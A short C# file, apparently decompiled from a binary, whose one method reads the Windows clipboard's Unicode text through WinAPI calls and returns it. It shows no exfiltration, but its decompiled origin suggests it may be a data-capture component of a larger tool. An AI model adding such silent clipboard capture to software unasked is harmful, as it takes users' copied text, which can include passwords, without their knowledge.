﻿using System;
using System.Runtime.InteropServices;

namespace SHARP
{
	// Token: 0x02000056 RID: 86
	internal class Buffers
	{
		// Token: 0x060001E0 RID: 480 RVA: 0x0000BC1C File Offset: 0x00009E1C
		public static string GetBuffer()
		{
			if (WinAPI.IsClipboardFormatAvailable(13U) && WinAPI.OpenClipboard(IntPtr.Zero))
			{
				string result = string.Empty;
				IntPtr clipboardData = WinAPI.GetClipboardData(13U);
				if (!clipboardData.Equals(IntPtr.Zero))
				{
					IntPtr intPtr = WinAPI.GlobalLock(clipboardData);
					if (!intPtr.Equals(IntPtr.Zero))
					{
						try
						{
							result = Marshal.PtrToStringUni(intPtr);
							WinAPI.GlobalUnlock(intPtr);
						}
						catch (Exception value)
						{
							Console.WriteLine(value);
						}
					}
				}
				WinAPI.CloseClipboard();
				return result;
			}
			return null;
		}

		// Token: 0x04000113 RID: 275
		private const uint CF_UNICODETEXT = 13U;
	}
}
